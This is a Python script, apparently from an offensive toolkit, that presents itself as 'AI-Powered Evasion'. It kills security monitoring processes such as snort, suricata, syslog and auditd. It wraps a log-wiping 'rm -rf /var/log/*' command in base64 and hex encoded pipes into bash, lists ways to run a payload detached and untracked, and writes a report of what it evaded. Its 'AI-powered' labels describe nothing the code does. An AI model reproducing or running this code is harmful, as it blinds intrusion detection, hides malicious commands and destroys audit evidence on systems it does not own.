import os
import json
import subprocess
import base64
import time
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Load Config
CONFIG_FILE = "config/settings.json"
if not os.path.exists(CONFIG_FILE):
    print(Fore.RED + f"⚠️ Config file {CONFIG_FILE} is missing! Run `setup_config.py`")
    exit(1)

with open(CONFIG_FILE) as config_file:
    config = json.load(config_file)

TARGET = config.get("TARGET", "example.com")
TIMEOUT = config.get("TIMEOUT", 10)

# Save Evasion Logs
def log_evasion(data):
    os.makedirs("reports", exist_ok=True)
    log_path = f"reports/{TARGET}_evasion.json"

    with open(log_path, "w") as log_file:
        json.dump(data, log_file, indent=4)

    print(Fore.GREEN + f"📄 Evasion Report saved: {log_path}")

# AI-Powered Payload Mutation
def obfuscate_payload(payload):
    """Obfuscates a given payload using Base64 encoding and string splitting."""
    encoded = base64.b64encode(payload.encode()).decode()
    obfuscated = f"echo {encoded} | base64 -d | bash"
    return obfuscated

# Disabling Security Tools
def disable_security_tools():
    print(Fore.CYAN + "🔍 Disabling Security Monitoring Tools...")

    tools = ["snort", "suricata", "wireshark", "syslog", "auditd"]
    killed_tools = []

    for tool in tools:
        result = subprocess.run(f"pkill {tool}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print(Fore.GREEN + f"✅ Killed: {tool}")
            killed_tools.append(tool)
        else:
            print(Fore.YELLOW + f"⚠️ Could not terminate: {tool}")

    return killed_tools

# Encodes Payloads
def encode_payload(payload):
    """Generates an encoded version of a given payload using different encoding techniques."""
    encoded_b64 = base64.b64encode(payload.encode()).decode()
    encoded_hex = payload.encode().hex()

    return {
        "base64": f"echo {encoded_b64} | base64 -d | bash",
        "hex": f"echo {encoded_hex} | xxd -r -p | bash"
    }

# Function to run stealth execution
def stealth_execution():
    print(Fore.CYAN + "🔍 Running AI-Powered Stealth Execution Techniques...")
    stealth_methods = [
        "nohup ./payload.sh &",  # Run in the background
        "setsid ./payload.sh",    # Run as a new session
        "./payload.sh & disown",  # Prevent process tracking
    ]
    selected_method = stealth_methods[0]  # Default method
    return selected_method

# Main Execution
def main():
    print(Fore.MAGENTA + "🚀 Running AI-Powered Evasion Techniques...")
    start_time = time.time()

    payload = "rm -rf /var/log/* && echo 'Logs cleared!'"  # Example payload

    results = {
        "killed_tools": disable_security_tools(),
        "obfuscated_payload": obfuscate_payload(payload),
        "encoded_payloads": encode_payload(payload),
        "stealth_execution": stealth_execution()
    }

    log_evasion(results)

    end_time = time.time()
    print(Fore.GREEN + f"✅ Evasion completed in {round(end_time - start_time, 2)} seconds.")

if __name__ == "__main__":
    main()
